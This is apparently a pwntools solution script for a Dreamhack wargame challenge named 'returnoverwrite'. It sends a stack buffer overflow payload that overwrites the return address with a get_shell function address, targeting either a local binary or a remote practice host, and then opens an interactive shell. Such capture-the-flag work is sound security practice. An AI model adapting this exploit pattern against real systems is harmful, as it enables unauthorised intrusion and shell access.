from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/returnoverwrite/rao')

context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:14773'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()


get_shell = 0x4006aa
payload = b"A"*48 + b"B"*8 + p64(get_shell)
p.send(payload)

p.interactive()
